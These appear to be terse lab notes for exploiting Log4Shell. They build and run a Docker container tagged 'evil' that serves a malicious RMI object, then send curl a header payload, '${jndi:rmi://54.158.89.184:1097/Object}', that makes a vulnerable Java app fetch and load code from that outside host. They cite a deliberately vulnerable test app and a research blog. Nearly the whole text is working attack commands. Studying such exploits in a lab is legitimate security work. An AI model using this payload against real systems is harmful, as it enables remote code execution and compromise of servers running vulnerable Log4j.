$ docker build -t evil:latest .
$ docker run -p 1097:1097 evil:latest

////////

# vulnerable application container is also running
$ curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:rmi://54.158.89.184:1097/Object}'

https://github.com/drahosj/log4shell-vulnerable-app

credit: https://www.veracode.com/blog/research/exploiting-jndi-injections-java
